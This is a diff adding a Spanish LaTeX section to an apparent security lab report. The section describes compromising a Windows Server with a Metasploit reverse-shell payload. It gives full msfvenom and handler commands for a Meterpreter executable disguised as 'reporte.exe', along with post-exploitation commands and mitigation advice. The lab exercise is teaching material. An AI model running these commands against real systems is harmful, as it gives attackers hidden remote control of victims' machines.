@@ -1,7 +1,100 @@
 \section{Cuarto ataque: Inyección de Payload}
 
 \subsection{Objetivo del ataque}
+
+El objetivo principal de este cuarto ataque es demostrar cómo un sistema operativo Windows puede ser comprometido mediante la ejecución de un \textit{payload} malicioso generado desde Kali Linux.  
+La finalidad del ataque es obtener acceso remoto no autorizado al sistema víctima, permitiendo al atacante ejercer control total sobre el equipo comprometido.
+
+Este ataque simula un escenario real de infiltración cibernética, en el cual un archivo ejecutable aparentemente legítimo es utilizado como vector de ataque para introducir código malicioso en el sistema objetivo.
+
+\subsection{Entorno del ataque}
+
+El ataque se llevó a cabo en un entorno controlado compuesto por los siguientes elementos:
+
+\begin{itemize}
+    \item \textbf{Máquina atacante}: Kali Linux con Metasploit Framework instalado.
+    \item \textbf{Máquina víctima}: Sistema operativo Windows Server.
+    \item \textbf{Red}: Red local configurada dentro del laboratorio.
+    \item \textbf{Herramienta de explotación}: Metasploit Framework y msfvenom.
+\end{itemize}
+
+Este entorno permitió evaluar el impacto de un ataque de ejecución remota de código sin afectar sistemas reales.
+
 \subsection{Herramientas utilizadas}
+
+Para la ejecución del ataque se emplearon las siguientes herramientas:
+
+\begin{itemize}
+    \item \textbf{msfvenom}: para la creación del payload malicioso.
+    \item \textbf{msfconsole}: para la gestión del handler y recepción de la conexión remota.
+    \item \textbf{Meterpreter}: para la interacción y control del sistema comprometido.
+\end{itemize}
+
 \subsection{Procedimiento}
+
+El procedimiento del ataque se desarrolló en varias etapas claramente definidas.
+
+\paragraph{Generación del payload}
+
+En primer lugar, se generó un archivo ejecutable malicioso diseñado para establecer una conexión inversa hacia la máquina atacante.  
+Este payload fue configurado con la dirección IP y el puerto del equipo atacante:
+
+\begin{lstlisting}[caption={Generación del payload malicioso}]
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=4444 -f exe -o reporte.exe
+\end{lstlisting}
+
+El archivo generado (\texttt{reporte.exe}) simula un archivo legítimo para inducir a la ejecución por parte del usuario objetivo.
+
+\paragraph{Configuración del handler}
+
+Posteriormente, se inició la consola de Metasploit y se configuró un \textit{handler} para recibir la conexión entrante desde la máquina víctima:
+
+\begin{lstlisting}[caption={Configuración del handler en Metasploit}]
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.0.115
+set LPORT 4444
+run
+\end{lstlisting}
+
+Este handler quedó a la espera de la ejecución del payload en el sistema Windows.
+
+\paragraph{Ejecución del payload y acceso remoto}
+
+Una vez ejecutado el archivo malicioso en la máquina víctima, se estableció una sesión \textit{Meterpreter} entre ambos sistemas.  
+Esta sesión permitió al atacante interactuar de forma remota con el sistema comprometido.
+
+\paragraph{Post-explotación}
+
+Con la sesión activa, se ejecutaron comandos de reconocimiento y control, tales como:
+
+\begin{lstlisting}[caption={Comandos de post-explotación}]
+sysinfo
+screenshot
+\end{lstlisting}
+
+Estos comandos permitieron obtener información del sistema y capturar evidencia visual del acceso no autorizado.
+
 \subsection{Resultados obtenidos}
+
+Como resultado del ataque, se logró establecer con éxito una conexión remota entre la máquina atacante y el sistema Windows víctima.  
+El atacante obtuvo acceso completo al sistema, pudiendo ejecutar comandos, recolectar información del sistema operativo y monitorear la actividad del usuario.
+
+Este resultado confirma la efectividad del uso de payloads maliciosos como vector de ataque para comprometer sistemas Windows.
+
 \subsection{Análisis y mitigación}
+
+El ataque evidencia la importancia de aplicar controles de seguridad frente a la ejecución de archivos maliciosos.
+
+Entre las medidas de mitigación recomendadas se encuentran:
+
+\begin{itemize}
+    \item Implementar soluciones antivirus y antimalware actualizadas.
+    \item Restringir la ejecución de archivos desconocidos o no firmados.
+    \item Aplicar políticas de control de aplicaciones (Application Whitelisting).
+    \item Mantener los sistemas operativos actualizados.
+    \item Capacitar a los usuarios sobre riesgos de ingeniería social.
+\end{itemize}
+
+Este cuarto ataque demuestra cómo la combinación de ingeniería social y ejecución de código externo puede derivar en el compromiso total de un sistema si no se aplican las medidas de seguridad adecuadas.
